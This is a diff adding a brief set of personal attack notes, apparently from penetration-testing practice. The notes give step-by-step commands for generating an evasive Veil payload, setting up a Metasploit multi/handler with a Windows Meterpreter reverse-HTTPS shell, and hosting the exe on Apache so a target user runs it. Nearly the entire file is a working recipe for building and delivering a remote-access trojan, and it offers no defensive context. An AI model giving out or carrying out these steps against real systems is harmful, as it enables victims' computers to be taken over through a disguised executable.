@@ -1,0 +1,19 @@
+Veil
+use 1
+list
+use 15 
+set LHOST KALI IP
+set LPORT 8080
+generate
+
+msfconsole
+use exploit/multi/handler
+show
+choose payload (SAME AS ON VEIL) example: set PAYLOAD windows/meterpreter/reverese_https
+set LHOST KALI IP
+set LPORT 8080
+exploit
+
+USER has to open the exe:
+var/www/html (COPY FILE HERE in a folder)
+service apache2 start
